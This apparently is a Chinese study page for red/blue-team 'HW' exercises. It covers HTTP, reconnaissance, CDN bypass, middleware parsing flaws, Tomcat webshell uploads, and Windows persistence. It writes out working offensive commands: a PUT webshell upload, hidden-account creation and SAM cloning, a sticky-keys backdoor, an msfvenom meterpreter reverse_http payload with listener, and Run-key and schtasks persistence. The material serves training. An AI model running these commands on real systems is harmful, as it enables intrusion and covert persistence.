---
icon: edit
date: 2023-04-30
category:
  - 护网行动
tag:
  - 护网
  - 蓝队
  - HVV
star: true
sticky: false
---

# 护网专题

## 渗透流程

- 信息收集
- 漏洞利用
- 权限提升
- 权限维持
- 内网代理
- 内网收集
- 内网漏洞
- 横向移动
- 跨域攻击
- 痕迹清理

## 什么是护网

### 什么是 HW 行动 

- 安全设备
  - GEVPN 网关
  - 机架式防火墙
  - 网闸
  - VPN
  - IDS
  - IPS
  - 蜜罐
  - VPN 网关
  - 动态感知
  - 安全邮件

### HW 人员职责划分

- 红队
  - 打点队员
  - 攻击队员
  - 社工队员
- 蓝队
  - 监控人员（初）
  - 研判人员（中）
  - 溯源人员（高）

### HW 需要具备的技能

- 红队
  - 外围打点、漏洞挖掘、漏洞分析、权限提升、权限维持、钓鱼远控、代码审计、木马免杀、内网渗透、横向移动、域渗透、跨域渗透

### 如何定制自己的学习路线

### HW 能给自己带来什么

### 哪些公司需要 HW 人员





## HTTP 介绍

### 网络协议介绍

**通信协议**是指双方实体完成通信或服务所必须遵循的规则和约定。

通信协议有三要素：

- 语法：即如何通信，包括数据和控制信息的结构或者格式
- 语义：即通信内容，可以发送什么数据和控制信息，完成什么动作或者做什么响应
- 时序：信息交流的次序，先发什么、响应什么、再发什么...



#### TCP/IP 协议簇

#### TCP/IP 四层模型

- 数据链路层

  实现网卡接口的网络驱动，在以太网、wifi 这些物理媒介上传输原始数据

- 网络层（网际互联层）

  选择中间节点，以确定两台主机之间的通讯路径

- 传输层

  负责节点的数据传输，实现格式化数据、发送数据、重连等功能

- 应用层

  为用户提供各种需要的服务

#### OSI 七层参考模型（Open System Inter Connection）

- 应用层
- 表示层
- 会话层
- 传输层
- 网络层
- 数据链路层
- 物理层

### HTTP 协议介绍

- 1971 年， TCP/IP 协议推出
- 1971 年， SMTP 协议推出
- 1971 年， FTP 协议推出
- 1972 年， Telnet 协议推出
  - `telnet bbs.newsmth.net`
- 1991 年， HTTP 协议推出（Hypertext Transfer Protocol，超文本传输协议），同时推出了 HTML （Hypertext Markup Language，超文本标记语言）、 URL （Uniform Resource Locator，统一资源定位符）、浏览器和 Web 服务器的概念。这 5 个概念统称为 WWW（World Wide Web， 万维网）

#### URI

- URL（Uniform Resource Identifier，统一资源标识符）
  - URN（Universal Resource Name， 统一资源名称）
  - URL（Uniform Resource Locator， 统一资源定位符）
    - `http://user:password@www.test.com:80/root/index.html?id=1#chapter1`
    - `协议://认证信息@服务器地址:端口/路径/文件名?参数#占位符`

### 

### HTTP 工作原理

### HTTP 消息结构

### HTTP 请求方法详解

|    对比项    | GET                                         | POST                                                                                         |
| :----------: | ------------------------------------------- | -------------------------------------------------------------------------------------------- |
|     用途     | 请求数据（查询）                            | 发送数据                                                                                     |
| 后端获取参数 | 从 URL 中直接获取                           | 从Body中获取                                                                                 |
|    可见性    | 参数在 URL 中可见                           | 参数在 URL 中不可见，存在与请求体中                                                          |
|    安全性    | 较差，有浏览历史、可保存为书签、可缓存      | 较好                                                                                         |
|   数据长度   | 浏览器对 URL 有长度限制，不同浏览器限制不同 | 几乎无长度限制                                                                               |
|   数据类型   | 只允许 ASCII 字符                           | 无限制                                                                                       |
|   连接过程   | 产生一个 TCP 数据包                         | **可能**产生两个 TCP 数据包（大多数浏览器会先发送TCP数据包，有响应之后再发送要处理的数据包） |

#### HTTP 响应头信息

#### 请求头

```
POST / HTTP/1.1
Host: www.baidu.com
Accept：image/jpeg
Referer: http://localhost:8080
Accept-Language:zh-CN
UserAgent: Mozilla/4.0
Content-Type: application/x-www-form-urlencoded
Host: localhost:80
Content-Length: 240
Connection: keep-alive
Cache-Control: no-cache
Cookie= JSESSIONID=123456

name=123&password=123456
```

#### 响应报文



### HTTP 状态码

| 类型 | 描述                                           |
| ---- | ---------------------------------------------- |
| 1xx  | 信息。服务器接收到请求，需要请求者继续操作     |
| 2xx  | 成功。操作被成功接收并处理                     |
| 3xx  | 重定向。需要进一步操作以完成请求               |
| 4xx  | 客户端错误。请求包含语法错误或者无法完成请求   |
| 5xx  | 服务端错误。服务端在处理请求的过程中发生了错误 |



###  HTTP 特点总结

1. 请求应答模式（HTTP 1.1 （含）之前服务器不会主动向客户端发送消息，只有在接收到客户端请求之后才能应答客户端消息； HTTP 2.0 新增了 Push 功能，服务端可以主动向客户端推送消息）
2. 灵活可扩展
3. 可靠传输
4. 无状态

### HTTP 服务器

- 第三方工具
  - Apache、Nginx、Tomcat、Weblogic、IIS 等
- 编程语言
  - Python。 `python -m http.server 8080`
  - Java。

### HTTP 客户端

- 浏览器
- APP
- Python Requests
- Java OKHttp、HTTPClient 等

### HTTP 调试工具

- 开发者工具
- HackBar
- Postman
- Burp Suite
- WireShark
- Fiddler
- Charles
- Curl 命令



## BurpSuite 的使用

### Burp 下载和激活

### Burp Suite 代理配置

### Burp Suite 拦截  HTTPS

### Burp Repeater 抓包与改包

### Burp Intruder 爆破密码



## 信息收集

### 域名信息收集

#### 域名是什么

#### 域名的分类

- 国际域名： `.com（商业公司）`、 `.net（网络服务）`、 `.org（组织协会）`、 `.gov（政府部门）`、 `.edu（教育机构）`、 `.mil（军事领域）`、 `.int（国际组织）`
- 国别域名： `.cn`、 `.uk`、 `.us` 等
- 新定级域名： `.biz`、 `.info`、 `.name`、 `.pro` 等

#### 域名联系人信息

- 域名注册商的 `whois` 信息
- 站长之家（`whois.chinaz.com`）的 `whois` 查询
- 站长之家（`whois.chinaz.com/reverse`） 的邮箱反查、注册人反查、电话反查等
- WhoisSoft 网站（`whoissoft.com`） 查询
- CNNIC 网站（`whois.cnnic.cn`）查询
- Kali 的 `whois` 命令
- 工信部域名备案系统（`beian.miit.gov.cn`）查询
- 备案巴巴（`beian88.com`）查看
- 天眼查、企业查等

#### 子域名信息

##### 子域名的概念

- `.com` 是顶级域名
- `baidu.com` 是百度的域名
- `news.baidu.com` 是百度新闻的域名，也是 `baidu.com` 的子域名
- `maps.baidu.com` 是百度地图的域名，也是 `baidu.com` 的子域名

##### 子域名爆破

- Layer 子域名挖掘机
- `phpinfo.me/domain` 在线子域名爆破
- `subDomainsBrute` 子域名爆破脚本（Python）

#### 域名 DNS 信息

>  DNS（Domain Name Server， 域名解析服务）

##### 域名记录类型

- `A`： 最常用的类型，将域名指向一个 `ipv4` 的地址
- `CNAME`： 别名类型，将域名指向另一个域名地址，与其保持相同的解析。
- `MX`： 用于邮件服务器，相关参数一般由邮件注册商提供
- `TXT`： 可填写附加文本信息，常用于域名验证
- `NS`： 域名服务器记录，可将指定域名交由其他 `DSN` 服务商解析管理
- `AAAA`： 将域名指向一个 `ipv6` 地址

### IP 资源的信息收集

##### 域名解析 IP

- `dbcha.com`
- `sitereport.netcraft.com`
- `ping` 命令。`Packet Internet Groper， 因特网包探索器`
- `nsloopup` 命令。 `net server lookup`， 网络服务查询

##### IP 归属信息查询

- 中国互联网信息中心（`ipwhois.cnnic.net.cn` ）查询

##### CDN 背后的真实 IP

> CDN（Content Delivery Network， 内容分发网络）是建立并覆盖在承载网上，由不同区域的服务器组成的分布式网络。将源站资源缓存到全国各地的边缘服务器，供用户就近获取，降低源站压力。

CDN 的实现原理：

1. 终端用户向指定资源发起请求时，首先向 LDNS（Local DNS）发起域名解析请求。
2. LDNS 检查缓存中是否有请求资源的 IP 地址记录。如果有，直接返回给终端； 如果没有，则向授权 DNS 查询。
3. 授权 DNS 解析请求 URL 时，返回域名 CNAME 对应的 IP 地址。
4. 域名解析请求发送 DNS 调度系统，并为请求分配最佳节点 IP 地址。（这里返回的是 CDN 服务商的 IP ，并非真实 IP ，绕过 CDN 找到真实 IP 成为了渗透工作中非常重要的一个环节） 
5. LDNS 获取 DNS 返回的解析 IP 地址。
6. 用户获取解析 IP 地址。
7. 用户向获取到的 IP 地址发起该资源的访问请求。

如何绕过 CDN 获取背后的真实 IP？

- 超级 ping （部分地区可能没有被 CDN 覆盖）
  - `ping.chinaz.com` 探测
  - `nslookup`
- 历史 DNS （可能早期还没有使用 CDN）
  - `http://dnshistory.org`
  - `http://toolbar.netcraft.com/site_report`
  - `https://tools.ipip.net/cdn.php`
  - `https://github.com/vincentcox/bypass-firewalls-by-DNS-history`
- 子域名查询（子域名可能与主域名在同一服务器，但子域名未使用 CDN）
- 国外主机解析（与超级 ping 原理类似，部分 CDN 厂商并未覆盖到国外）
  - `https://asm.ca.com/zh_cn/ping.php`
  - `http://host-tracker.com`
  - `http://www.webpagetest.org`
  - `https://dnscheck.pingdom.com`
- 其他
  - 网络空间引擎（fofa、 censys 等）
  - 邮件
  - 手机 APP 抓包
  - 微信服务号抓包
  - ...

### 端口服务信息

### CMS 指纹识别

### CDN 指纹识别

### WAF 指纹识别

### 搜索引擎信息收集

### 网络空间搜索引擎

### 目录扫描

### Git 信息收集

### 网站信息收集

### 人力资源信息收集

### 社会工程学信息收集





## SQL 注入

### MySQL 基本操作

### SQL 注入漏洞概述

### SQL 注入实战详解

### SQL 常见绕过技巧

### SQL MAP 工具的使用

### SQL 注入的防护



## 命令执行

### Linux 常用命令讲解

### Windows 常用命令讲解

### 命令执行概述和介绍

### PHP 命令执行函数详解

### 命令执行漏洞的利用

### 命令执行的防护方法



## XSS、CSRF、SSRF、XXE

### XSS 漏洞概述

### 存储型和反射型 XSS 详解

### XSS 漏洞的利用

### CSRF 漏洞的利用

### GET 型和 POST 型的 XSS

### XSS 和 CSRF 漏洞防护

### XXE 漏洞概述

### XXE 文件读取详解

### XXE 内网探测详解

### XXE 内网应用攻击详解

### XXE 命令执行详解

### XXE 防护

### SSRF 漏洞概述

### SSRF 端口探测详解

### SSRF 读取文件详解

### SSRF内网应用攻击详解

### SSRF 防护 



## 中间件漏洞

### Apache 解析漏洞

> 解析漏洞主要说的是一些特殊文件被 IIS、Apache、Nginx 在某些情况下解释成脚本文件格式的漏洞

##### 漏洞简介

> Apache 文件解析漏洞与用户的配置有密切关系。严格来说，并不能称之为漏洞，这属于用户配置失误，apache 本身并不存在所谓的解析漏洞。

##### 漏洞原理

> Apache 默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在 `apache` 的 `config` 目录下的 `mime.types` 列表内）时，则继续向左识别。
>
> 解析漏洞的产生，是由于运维人员在配置服务器时，为了使 apache 服务器能够解析 php，而自己添加一个 handler
>
> `AddType application/x-httpd-php .php`
>
> 它的作用也是为了让 apache 把 php 文件交给 php_module 解析，但是注意到 AddHandler 与 setHandler 不同， 它的后缀不是用正则去匹配的。所以，在文件名的任何位置匹配到 php 后缀，都会让 php_module 解析

漏洞修复

> 不要 AddHandler，改用 SetHandler，如下使用正则限制文件名，就不会有解析问题
>
> ```xml
> <FilesMatch ".(php.|php3.|php4.|php5.)">
> Order Deny,Allow
> Deny from all
> </FilesMatch>
> ```
>
> 如果需要保留文件名，也可以修改程序源码，替换上传文件名中的 "." 为 "_"
>
> ```php
> $filename = str_repace('.', '_', $filename);
> ```

##### CVE-2017-15715

漏洞介绍

> Apache HTTPD 是一款 HTTP 服务器，它可以通过 `mod_php` 来运行 PHP 网页。 其 2.4.0 ~ 2.4.29 版本中存在一个解析漏洞，在解析 PHP 时， 例如 `123.php\x0a` 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。

漏洞原理

1. apache 这次解析漏洞的根本原因就是这个 `$`， 在正则中，`$` 用来匹配字符串结尾位置

   > `$` 符号： 匹配输入字符串的结尾位置，如果设置了 `RegExp` 对象的 `Multilne` 属性，则 `$` 也会匹配 `\n` 或 `\r`。 
   >
   > 如果设置 `Multiline` 标示，就当做换行符处理，如果不设置就当做一行文本处理

2. 以一个靶场为例，找到 `apache` 核心配置文件 `apache2.conf`， 查看配置文件

   > ```xml
   > IncludeOptional conf-enabled/*.conf
   > IncludeOptional sites-enabled/*.conf
   > ```

3. 跟进发现关于 `php` 的配置文件为 `docker-php.conf`

   ```xml
   <FilesMatch \.php$>
   	SetHandler application/x-httpd-php
   </FilesMatch>
   ```

4. 可以看到正则 `\.php$` ，因为结尾的 `$`， 将匹配 `\n` 或 `\r`， 所以修改数据包在文件名后加上 `\n`， `\n` 的十六进制是 `0a`

5. 查看 `index.php` 文件中的 `php` 源码

   ```php
   <?php 
       if(isset($_FILES['file'])){
           $name = basename($_POST['name']); // 漏洞成因。 不会过滤 name 中的 \n， 造成解析漏洞
           // $name = basename($_FILES['file']['name']); // 会过滤 name 中的 \n， 无法造成漏洞
           $ext = pathinfo($name, PATHINFO_EXTENSION);
           if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])){
               exit('bad file');
           }
           move_upload_file($_FILES['file']['tmp_name'], './'.$name);
       }else{
           // 上传文件的 form
       }
   ?>
   ```

6. 关于 Windows 和 Linux

   > 这个漏洞只能在 Linux 操作系统下正常利用，因为在 Windows 系统中，涉及到文件读写，操作系统是不允许后缀名以换行符结尾的，所以创建文件会失败，出现 warning 警告。

漏洞复现

1. burp 抓包，在 hex 编码中的文件名后添加 `0a`十六进制码
2. 重发请求包

漏洞修复

- 升级 Apache HTTPD 版本
- 将上传的文件重命名为 "随机+后缀" 的格式并禁用上传文件目录执行脚本权限
- 获取文件名时手动过滤换行符或使用 `$_FILES['file']['name']` 获取文件名
- 在 `httpd.conf` 中加入其它正则表达式加强校验规则

### PHP CGI 解析漏洞

##### 漏洞简介

>  例如 `http://www.xxx.com/x.jpg/x.php` 解析的时候，如果 `x.php` 不存在， `php` 就会向前解析，如果 `x.jpg` 存在，就会把 `x.jpg` 当做 `php` 文件解析，从而产生漏洞。

##### 漏洞原理

1. 首先先了解 `php` 和 `apache` 的三种结合方式：
   1. `Module` 模式： `php` 作为 `apache` 的模块，`php` 进程和 `apache` 进程合在一块
   2. `CGI` 模式： `CGI` 一般是可执行程序，例如 `exe` 文件，每次都 `fork` 一个进程来运行外部的 `exe` 文件，并且只能处理一个用户请求，处理完成后就会退出，当用户请求数量非常多时，会频繁的 `fork` 进程和退出进程，占用大量系统的资源，效能低下，每次 `fork` `php` 进程独立运行处理。
   3. `FastCGI` 模式： 在 `web` 服务器启动的时候，`FastCGI` 处理进程就开启而且不会退出，接收到请求后，服务器通过 `TCP` 或者本地 `socket` 直接把内容传递给 `FastCGI` 进程，常驻内存不需要每次都 `fork` 进程
2. `PHP` 配置文件中有一个参数是 `cgi.fix_pathinfo`， 如果参数 `cgi.fix_pathinfo=1`，则产生漏洞
3. `location` 对请求进行选择的时候会使用 `URI` 环境变量进行选择，其中传递到后端 `Fastcgi` 的关键变量 `SCRIPT_FILENAME` 由 `nginx` 生成的 `$fastcgi_script_name` 决定，而通过分析可以看到 `$fastcgi_script_name` 是直接由 `URI` 环境变量控制的，这里就是产生问题的点。而为了较好的支持 `PATH_INFO` 的提取，在 `PHP` 的配置选项里存在 `cgi.fix_pathinfo` 选项，其目的是为了从 `SCRIPT_FILENAME` 里面取出真正的脚本名。

##### 漏洞复现

1. 打开 `php.ini` 配置文件，将 `cgi.fix_pathinfo` 的值配置为 `1`
2.  尝试访问 `http://127.0.0.1/phpinfo.php/1.jpg`
   - `phpinfo.php` 存在，`1.jpg` 也存在时，`1.jpg` 会被当做 `php` 文件解析，漏洞产生。
   - `phpinfo.php` 存在， `1.jpg` 不存在时，会向前解析 `phpinfo.php`

### IIS6.0 解析漏洞



### IIS7.x 解析漏洞

##### 漏洞简介

1. `IIS 7.x` 在解析 `asp` 文件时不存在解析漏洞
2. `IIS 7.x` 在解析 `php` 文件时，如果 `php` 配置文件中 `cgi.fix_patchinfo=1`， 就会产生解析漏洞。如： `http://www.xxx.com/x.jpg/x.php` ，如果 `x.php` 不存在，`php` 就会向前解析，如果 `x.jpg` 存在，就会将 `x.jpg` 当做 `php` 文件解析，从而产生漏洞



### Nginx 解析漏洞

### IIS 漏洞详解

### Apache 漏洞详解

##### Apache 常见漏洞

- Apache APISIX 默认密钥漏洞
- Apache HTTPD 换行解析漏洞
- Apache HTTP Server 2.4.48 mod_proxy SSRF 漏洞
- Apache HTTP Server 2.4.49 路径穿越漏洞
- Apache HTTP Server 2.4.50 路径穿越漏洞
- Apache HTTPD 未知后缀名解析漏洞
- Apache SSI 远程命令执行漏洞
- Apache Flink 文件上传漏洞
- Apache Flink jobmanager/logs 目录穿越漏洞
- Apache Jmeter RMI 反序列化命令执行漏洞（CVE-2018-1297）
- Apache Log4j Server 反序列化命令执行漏洞
- Apache Log4j2 lookup JNDI 注入漏洞
- Apache OfBiz 反序列化命令执行漏洞
- Apache Shiro 1.2.4 反序列化漏洞
- Apache Shiro 认证绕过漏洞
- Apache Skywalking 8.3.0 SQL 注入漏洞
- Apache solr XML 实体注入漏洞
- Apache solr 远程命令执行漏洞
- Apache solr Velocity 注入远程命令执行漏洞
- Apache solr RemoteStreaming 文件读取与 SSRF 漏洞
- Apache Spark 未授权访问漏洞
- Apache Tomcat AJP 文件包含漏洞
- Apache Unomi 远程表达式代码执行漏洞

### Tomcat 漏洞详解

> Tomcat 是 Apache 软件基金会的 Jakarta 项目中的一个核心项目。
>
> Tomcat 服务器是一个免费的开源 Web 应用服务器，属于轻量级应用服务器，应用十分广泛。

##### Tomcat 常见的漏洞

- Tomcat AJP 文件包含漏洞
- Tomcat 弱口令
- Tomcat 反序列化漏洞（CVE-2016-8735）
- Tomcat 本地提权漏洞（CVE-2016-1240）
- Tomcat JMX 服务弱口令
- Tomcat Put 上传漏洞（CVE-2017-12615）
- Tomcat Win 版本默认空口令
- Tomcat 样例目录 session 操控漏洞

##### Tomcat 弱口令

###### 漏洞介绍

> `Tomcat` 存在管理后台用来进行应用部署管理，并且管理后台使用的是 HTTP 基础认证进行登录。如果用户口令为弱口令，攻击者可以轻易的进行爆破登录后台并进行应用管理。 `Tomcat` 支持在后台部署 `war` 文件，可以直接将 `webshell` 部署到 `web` 目录下。

###### 漏洞原理

在 `Tomcat` 配置文件中存在错口令

```xml
cd /usr/local/tomcat/conf
cat tomcat-users.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              ...>
	<role rolename="manager-gui" />
    <role rolename="manager-script" />
    <role rolename="manager-status" />
    
    <user username="tomcat" password="tomcat" roles="manager-gui, manager-script" />
</tomcat-users>
```

###### 漏洞复现

1. 打开漏洞网页环境（`Tomcat 首页`）
2. 点击右侧 `Manager App` 按钮进入管理后台，会提示输入用户名和密码（如果这里是弱口令，就可以被爆破）
3. 进入管理后台后，找到 `war file to deploy` 模块，这里可以上传任务 `war` 文件并部署
   1. 写一个一句话木马 `shell.jsp`
   2. 生成 `war` 包。 `jar cvf shell.war shell.jsp`
   3. 将生成的 `war` 包上传并部署
4. 访问一句话木马（`http://xxx.xxx.xxx.xxx/shell/shell.jsp`）。
5. 使用远程交互工具，连接一句话木马。

##### Tomcat Put 上传

###### 漏洞简介

> `CVE-2017-12615` 任意文件写入漏洞，是由于 `Tomcat` 配置不当，导致可以使用 `PUT` 方式上传任意文件

###### 漏洞原理

在 `Tomcat` 配置文件中设置了 `PUT` 上传方法，在  `web.xml` 文件中，默认 `readonly` 的值为 `true`， 当 `readonly` 设置为 `false` 时，可以通过 `PUT/DELETE` 进行文件操控，从而产生漏洞。

###### 漏洞复现

1. 打开漏洞网页环境（`Tomcat` 首页）

2. 打开 `BP`， 发送 `PUT` 数据包（由于 `Tomcat` 的默认限制，可能无法直接发送 `.jsp` 文件，但是可以通过 `Linux` 的特性，如加 `/` 来绕过）

   ```xml
   PUT /1.jsp/ HTTP/1.1
   Host: ip:8080
   Accept: */*
   Accept-Language: en
   User-Agent: Mozilla/5.0
   Connection: close
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 5
   
   一句话木马
   ```

3. 访问一句话木马（`http://xxx.xxx.xxx/1.jsp`）

4. 使用远程交互攻击，连接一句话木马

### WebLogic 漏洞详解

##### WebLogic 常见漏洞

- WebLogic 控制台路径泄露
- WebLogic 弱口令
- WebLogic SSRF（CVE-2014-4210）
- WebLogic 反序列化（CVE-2015-4852）
- WebLogic 反序列化（CVE-2016-0638）
- WebLogic 反序列化（CVE-2016-3510）
- WebLogic 反序列化（CVE-2017-3248）
- WebLogic 反序列化（CVE-2018-2628）
- WebLogic 反序列化（CVE-2018-2893）
- WebLogic 反序列化（CVE-2018-2894）
- WebLogic XMLDecoder 反序列化（CVE-2017-10271）
- WebLogic XMLDecoder 反序列化（CVE-2017-3506）
- WebLogic 未授权访问（CVE-2020-14883）

### JBoss 漏洞详解

### Ngnix 漏洞详解



## 反序列化漏洞

### 反序列化介绍

### 序列化与反序列化

### PHP 魔法函数介绍

### PHP 反序列化漏洞利用

### Java 反序列化漏洞利用



## 文件上传

### 文件上传概述

### 前端 JS 文件上传绕过

### 白名单文件上传绕过

### 黑名单文件上传绕过

### 条件竞争文件上传绕过

### 文件上传防护



## 文件包含

### 文件包含概述

### 文件包含漏洞利用

### PHP 为协议详解

### 文件包含防护



## Wireshark 使用和分析

### Wireshark 介绍

> Wireshark 是一个网络封包分析软件。功能是截取网络封包，并尽可能的显示出最为详细的网络封包资料。
>
> Wireshark 使用 WinPCAP 作为借口，直接与网卡进行数据报文交换
>
> Wireshark 在支持协议的数量方面出类拔萃，截止目前已提供了超过 850 种协议的支持。这些协议包括从最基础的 IP 协议和 DHCP 协议到高级的专用协议，比如 `ApleTalk` 和 `BitTorrent` 等。由于 Wireshark 在开源模式下进行开发，所以每次更新都会增加一些对协议的支持。

#### Wireshark 的主要功能

1. 实时抓取数据包（抓包模块）
2. 对已获取的数据包进行流量分析（分析模块）

#### Wireshark 的界面介绍

1. 分组列表

   流量信息的基本信息（时间、源IP、目标IP、协议、长度、简述等）

2. 分组详情

   流量信息的 `TCP/IP` 5 层模型形式

   - 物理层
   - 数据链路层（MAC）
   - 网络层（IP）
   - 传输层（PORT）
   - 应用层

3. 分组字节流

   流量信息的十六进制形式

### Wireshark 分析步骤



### Web 攻击流量分析

### Webshell 通信流量分析



## 权限维持

### Windows 权限维持

#### 用户维持

##### 隐藏账户维持

**隐藏账户**就是计算机下通过**一般查看方式**看不到的账户。

###### 使用 `$` 符号隐藏账户

`$` 符号隐藏账户，就是在用户名后面添加 `$` 符号（如： `hacker$`）来达到简单隐藏账户的目的

1. 查看当前操作系统下的账户列表
> `net user`

2. 创建一个隐藏账户
> `net user hacker$ Admin@123 /add`

3. 查看当前操作系统下的账户列表
> `net user`

4. 在【控制面板-管理用户列表】或【计算机管理-本地用户和组】中都可以查看到



###### 注册表克隆用户隐藏

**注册表隐藏**是建立在已经存在隐藏账户的基础上（也就是上一步 `$` 隐藏账户之后）进一步的隐藏操作。

1. 打开注册表

   进入 `HKEY_LOCAL_MACHINE\SAM\SAM\Domains|Account\Users\Names` 目录

   如果 `SAM` 目录下无法继续展开，需要“右键”-“权限”赋予“Administrator”-“完全控制”权限

2. 导出隐藏账户

   选中隐藏账户（如 `hacker$`），“右键”-“导出”（保存为 `1.reg`）

3. 注册表克隆账户

   选中 `Administrator` 账户，其 `Value` 为一个十六进制数字（如：`3EB`），对应上一级目录（`Users`）下的一个目录名（如：`000003EB`，这里存储的是对应账号的权限二进制值），选中对应的目录，右侧会有两个 `Key`（`F` 和 `V`），双击打开 `F` 的二进制数值，全选，复制，替换到隐藏账户（如 `hacker$`）对应的 `F` 的二进制数值。

4. 导出隐藏账户权限（已经被篡改，拥有被克隆账号的权限）

   选中隐藏账户（如 `hacker$`）对应的上级目录，导出（保存为 `2.reg`）

5. 删除隐藏账户

   `net user hacker$ /del`

6. 执行 `1.reg` 创建隐藏账户

7. 执行 `2.reg` 为隐藏账户赋权

8. 此时，除“注册表”与部分扫描工具之外，很难查看到 `hacker$` 账户

#### Shift 后门维持

##### Windows 粘滞键

**Windows 粘滞键**是 Windows 提供给不方便使用组合键的用户设计的功能。

在 Windows 系统中，连续按 5 下 `Shift` 键就会启动粘滞键。

粘滞键本身是调用 `C:\Windows\System32\sethc.exe` 程序。

此程序所运行的权限是当前登录用户，**但是，当未登录系统（停留在登录界面）时，连续按 5 次粘滞键，系统将会以 `system` 账户来运行 `sethc.exe` 程序**。

##### Shift 后门维持原理

备份 `sethc.exe` 程序，将 `cmd.exe` 程序更名为 `sethc.exe` ，在登录界面连续按 5 下 `Shift` 键，系统将会以 `system` 账户来打开 `cmd.exe`

##### Shift 后门制作

1. 提升文件权限

   `takeown /f c:\window\system32\*.* /a /r /d y`

   强制将目录下所有文件及文件夹、子文件夹下的所有者更改为管理员组（`administrator`）

   `cacls c:\windows\system32\*.* /T /E /G administrators:F`

   在当前目录下的文件、子文件夹的 `NTFS` 权限上添加管理员组（`administrator`）的完全控制权限（并保留原有的 `NTFS` 权限设置）

2. 复制 `cmd.exe` 为 `sethc.exe`（不提升权限有可能会提示拒绝访问）

   `copy c:\windows\system32 cmd.exe c:\windows\system32\sethc.exe`

3. 在登录界面，连按 5 下 `Shift` 键，即可以 `system` 账户打开终端



#### 启动项维持

**启动项**就是开机的时候系统会自动前台或者后台运行加载的程序。

##### 组策略维持

###### 组策略介绍

**组策略**（`Group Policy`）是微软家族操作系统的一个特性，它可以控制用户账户和计算机账户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。组策略的其中一个版本名为**本地组策略**（`LGPO`或`LocalGPO`），这可以在独立且非域的计算机上管理组策略对象。

**利用原理**： 在组策略中添加 `payload`，利用组策略的自启动策略来加载 `payload` 文件

###### 组策略位置

1. 打开组策略

   `gpedit.msc`

2. 在【Windows设置】【脚本（启动/关闭）】，双击【启动】

3. 选择要添加的脚本或者 `powershell`

###### 利用方式

1. `Kali` 上生成 `powshell` （以 `msf` 为例）

   `msfvenom -p windows/x64/meterpreter/reverse_http -e x86/shikata_ga_nai -i 15 -b '\x00' lhost=192.168.xxx.xxx lport=8888 -f psh -o shell.ps1`

2. 将 `shell.ps1` 传输到目标机器上

3. `Kali` 启动 `msf` 监听

   `msfconsole`

   `use exploit/multi/handler`

   `set payload windows/x64/meterpreter/reverse_http`

   `set LHOST 192.168.xxx.xxx`

   `set LPORT 8888`

   `run`

4. 运行 `shell.ps1` （测试是否正常）

   `powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File shell.ps1`

   - `-w hidden` 隐藏窗口
   - `-ExecutionPolicy Bypass` 绕过策略
   - `-NoExit` 不退出

5. 创建一个 `bat` 脚本（命名 `1.bat`），将运行 `shell.ps1` 的命令放在里面

   ```bat
   @echo off
   powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File shell.ps1
   exit
   ```

6. 打开组策略，在【Windows设置】【脚本（启动/关闭）】，双击【启动】，添加脚本，选中 `1.bat`



##### 启动文件夹维持

###### 启动文件夹介绍

**启动文件夹**是 Windows 的 C 盘下的一个文件夹，这个文件夹中的所有程序都会在系统开机时自动启动。

###### 启动文件夹位置

> 启动文件夹
>
> `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` # 系统级，需要 `system` 权限
>
> `C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start\Menu\Programs\Startup` # 用户级，普通用户就可以
>
> 组策略脚本启动文件夹
>
> `C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup`
>
> `C:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown`
>
> `C:\Windows\System32\GroupPolicy\User\Scripts\Login`
>
> `C:\Windows\System32\GroupPolicy\User\Scripts\Logoff`



##### 注册表启动项维持

###### 注册表介绍

**注册表（繁体系统中称之为“登录档”）**是 Windows 操作系统中的一个重要的数据库，用于存储系统和应用程序的设置信息。

###### 注册表位置

`regedit`

###### 利用方式

1. Windows 注册表中存在的自启动后门较多。此处是较为经典的两类

   > `# HKEY_LOCAL_MACHINE ` 类
   >
   > `HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\Run`
   >
   > `HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunOnce`
   >
   > `HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunOnceEx`
   >
   > `HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunService`
   >
   > `HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunServiceOnce`

   

   > `# HKEY_CURRENT_USER` 类
   >
   > `HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\Run`
   >
   > `HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunOnce`
   >
   > `HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunOnceEx`
   >
   > `HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunService`
   >
   > `HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunServiceOnce`

2. `reg add` 命令将 `payload` 添加到注册表启动项中

   `reg add "HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\Run" /v shell /t REG_SZ /d "C:\Users\Administrator\Desktop\1.bat"`



#### 计划任务维持

##### 计划任务介绍

计划任务是系统常见的功能，利用计划任务，可以将任何脚本、程序或者文档安排在某个指定的时间运行。计划任务会在每次系统启动的时候自动启动并在后台运行。

###### 计划任务的打开方式

1. 【管理工具】-【计划任务程序】
2. 【控制面板】-【计划任务】
3. `taskschd.msc` 命令

##### 计划任务生成方式

1. `schtasks`

   > 在任意用户登录中以 `SYSTEM` 的形式执行计划任务
   >
   > `schtasks /create /tn 计划任务名 /tr "计划任务执行文件命令" /sc onlogon /ru System`
   >
   > 在系统启动期间或用户会话处于非活动状态（空闲模式）时执行
   >
   > `schtasks /create /tn 计划任务名 /tr "计划任务执行文件名" /sc onidle /i 30`
   >
   > 在系统启动的时候以 `SYSTEM` 的形式执行计划任务
   >
